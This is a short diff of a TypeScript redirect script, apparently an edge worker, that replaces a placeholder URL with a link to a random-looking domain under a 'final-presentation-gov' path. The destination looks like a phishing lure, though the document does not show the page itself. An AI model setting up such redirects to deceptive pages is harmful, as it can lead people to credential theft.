@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "http//google.com"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://zxhsxd.com/final-presentation-gov/index.html"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
